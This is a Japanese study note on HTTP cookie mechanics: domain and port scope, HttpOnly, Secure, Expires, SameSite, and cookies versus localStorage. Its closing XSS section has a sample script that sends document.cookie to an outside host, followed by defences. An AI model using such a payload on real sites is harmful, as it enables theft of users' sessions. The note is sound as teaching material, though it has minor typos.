# 課題１（質問）

## クッキーとは（「Set-cookie」「ヘッダ」「サーバ」「ブラウザ」という単語を使って仕組み説明）

- クッキーとは、key=value の組み合わせで表現される情報のこと
  - `<cookie-name>=<cookie-value>`
    - `cookie-name`: US-ASCⅡ の文字列（制御文字、空白、タブを除く。`()<>@,;:\"/[]?={}`など区切り文字も含めない）
    - `cookie-value`: US-ASCⅡ の文字列（任意でダブルクォートで括れば、制御文字、ホワイトスペースなども使用可能。ただし`",;\`だけは使えない）
- Set-cookie は HTTP レスポンスヘッダ
  - このヘッダを使ってサーバーからクライアントにクッキーを送信することができる

## www.hoge.comで発行されたクッキーは、www.fuga.comにも送信されるか（異なるホスト間でクッキーは共有できるか）

- NO
  - セキュリティ上の理由でユーザーエージェントが拒否するため
- ただし`Set-Cookie`ヘッダに`Domain=<domain-value>`属性を指定することで、そのドメイン（example.com）と、そのサブドメイン（sub.example.com）間ではクッキーを使用できる
  - **※`Domani=other-domain.com`のようにホスト名が異なるクッキーは設定できない。**

## hoge.com:8080 のクッキーは hoge.com:9090 にも送信されるか（異なるポート間でクッキーは共有できるか）

- YES
  - この場合、`hoge.com`がホスト名、`8080`や`9090`がポート番号にあたるが、[RFC6265 Section8.5](https://datatracker.ietf.org/doc/html/rfc6265#section-8.5)によると、ポート番号での識別はしないとのこと
    > Cookies do not provide isolation by port. （クッキーはポート番号による分離を提供するものではない）

## www.hoge.comで発行されたクッキーは、www.api.hoge.comにも送信されるか（サブドメイン間でクッキーは共有できるか）

前述の回答通り、`Set-Cookie`ヘッダに`Domain=hoge.com`属性を指定すれば送信される

## クッキーに Domain="hoge.com"を指定した場合、api.hoge.com にもクッキーは送信されるでしょうか？理由を説明してください

- YES
  - 異なるサブドメイン間でログインセッションなどのデータを共有したいことはままあるため
  - [（参照）サブドメインの異なるサービスで cookie を共有する](https://qiita.com/il-m-yamagishi/items/9aad5737c80d5bfd5eb8)

## JavaScript からクッキーの値が取得されることを防ぐには

httpOnly 属性を有効にする

## HTTPS（暗号化）通信の時だけクッキーを送信するには

Secure 属性を有効にする

## クッキーに Expires を設定すると、どのように挙動が変わるか

- Cookie に有効期限が付与される
  - `Exprises=<date>`形式で、サーバーではなくクライアントからの相対時刻で設定される
  - 設定していない場合、クッキーはセッションクッキーとなり、セッションが終了したとき（クライアントが終了したとき）に削除される

## SameSite 属性とは

- ドメイン間リクエストにおけるクッキーの送信設定を行う属性
- `SameSite=<samesite-value>`形式で指定する

  - `samesite-value`: `Strict`, `None`, `Lax`の３種類の設定値がある（モダンブラウザのデフォルト値は`Lax`）
  - `cross-site`へのクッキー送信可否における違いがある

    ### 1. `Strict`

    `same-site`では常に付与する。`cross-site`では常に付与しない。

    ### 2. `None`

    `same-site`では常に付与する。`cross-site`でも常に付与する。

    ### 3. `Lax`

    `same-site`では常に付与する。`cross-site`では、`Top Level Navigation` かつメソッドが `safe` のときにのみ、付与する。

    - `Top Level Navigation`とは: ブラウザのアドレスバーに表示されている URL の変更が伴う遷移のこと
    - `safe method`とは：対象リソースに変更を加えないメソッド（`GET`, `HEAD`, `OPTIONS`, `TRACE`）

    つまり`cross-site`のとき、**`POST`メソッドでのリクエスト**だったり、**`img`や`iframe`でのリクエスト**では、クッキーは送信されない。が、リンクタグとフォームタグ（safe メソッドのみ）からのリクエストではクッキーは送信される。

[（参照）Cookie の SameSite 属性が Lax の時の挙動](https://qiita.com/muk-ai/items/10aab285784e780ef631)

## クッキーに格納しない方が良い情報の例

パスワード、クレカ番号、電話番号など人に知られてはいけないデータ（devtool から確認できるため）

## クッキーを使うべきタイミングと、ローカルストレージを使うべきタイミング

- [比較表](https://qiita.com/terufumi1122/items/76bafb9eed7cfc77b798)
  - 容量の大きさ、有効期限設定可否、サーバー側でそのデータを使いたいかなどによって判断できそう
    - サーバー側で情報が必要な場合: cookie がよい
    - EC サイトのカート情報など: localStorage がよい
    - etc...

## 掲示板サービスなどを開発する際、XSS（クロスサイトスクリプティング）により、他ユーザのクッキー情報が抜き出される仕組みとその対策

脆弱性のあるサイトにスクリプトを埋め込んで、リダイレクトや iframe タグなどから攻撃者が用意したサイトへのリンクを踏ませることができれば、アクセスログなどにより秘匿情報を確認できる。

```js
// sample
<scrpit>location.href=`http://sample.com?${document.cookie}`</script>
```

### 対策

- 入力値のバリデーション、出力値のエンコーディングを徹底する
- JS 経由で cookie にアクセスできないように`httpOnly`属性を有効化する
- その他もいろいろある
  - [（参照）安全なウェブサイトの作り方 - 1.5 クロスサイト・スクリプティング](https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_5.html)
